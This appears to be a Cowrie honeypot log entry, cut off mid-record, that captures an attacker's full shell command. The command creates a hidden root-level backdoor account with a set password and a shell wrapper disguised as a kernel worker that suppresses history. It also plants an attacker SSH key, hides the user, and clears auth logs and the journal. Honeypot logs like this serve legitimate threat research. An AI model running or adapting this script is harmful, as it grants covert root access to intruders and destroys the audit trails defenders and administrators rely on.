{"eventid":"cowrie.command.input","input":"#!/bin/bash; userdel ducc0x 2>/dev/null; umount /etc/passwd 2>/dev/null; groupadd -g 666 ducc0x 2>/dev/null; useradd -u 0 -g 0 -G ducc0x -o -m -d /home/ducc0x -s /bin/bash -c \"root backdoor\" ducc0x; echo \"ducc0x:phuvanduc\" | chpasswd; mkdir -p /lib/.sys; cat > /lib/.sys/bash <<'EOF'; #!/bin/bash; if [[ $PPID -ne 1 && $(id -u) -eq 0 && $(whoami) = \"ducc0x\" ]]; then;     export PROMPT_COMMAND='history -a; history -c';     exec -a \"[kworker/0:1]\" /bin/bash \"$@\"; else;     exec /bin/bash \"$@\"; fi; EOF; chmod 755 /lib/.sys/bash; usermod -s /lib/.sys/bash ducc0x; mkdir -p /home/ducc0x/.ssh; cat > /home/ducc0x/.ssh/authorized_keys <<'EOF'; ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMdeR2lOaPNvQ/5vZ0FpKxX8iU5gE7Qs9jZkmN+1a2b duc_backdoor_2025; EOF; chmod 600 /home/ducc0x/.ssh/authorized_keys; chown -R ducc0x:ducc0x /home/ducc0x/.ssh; echo \"ducc0x\" >> /etc/hide_users 2>/dev/null || touch /etc/hide_users && echo \"ducc0x\" >> /etc/hide_users; cat > /etc/profile.d/hide_ducc0x.sh <<'EOF'; [ \"$UID\" = \"0\" ] && export HIDE_USER=ducc0x; EOF; journalctl --vacuum-time=2d &>/dev/null; > /var/log/auth.log 2>/dev/null; > /var/log/secure 2>/dev/null; history -c","message":"CMD: #!/bin/bash; userdel ducc0x 2>/dev/null; umount /etc/passwd 2>/dev/null; groupadd -g 666 ducc0x 2>/dev/null; useradd -u 0 -g 0 -G ducc0x -o -m -d /home/ducc0x -s /bin/bash -c \"root backdoor\" ducc0x; echo \"ducc0x:phuvanduc\" | chpasswd; mkdir -p /lib/.sys; cat > /lib/.sys/bash <<'EOF'; #!/bin/bash; if [[ $PPID -ne 1 && $(id -u) -eq 0 && $(whoami) = \"ducc0x\" ]]; then;     export PROMPT_COMMAND='history -a; history -c';     exec -a \"[kworker/0:1]\" /bin/bash \"$@\"; else;     exec /bin/bash \"$@\"; fi; EOF; chmod 755 /lib/.sys/bash; usermod -s /lib/.sys/bash ducc0x; mkdir -p /home/ducc0x/.ssh; cat > /home/ducc0x/.ssh/authorized_keys <<'EOF'; ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMdeR2lOaPNvQ/5vZ0FpKxX8iU5gE7Qs9jZkmN+1a2b duc_backdoor_2025; EOF; chmod 600 /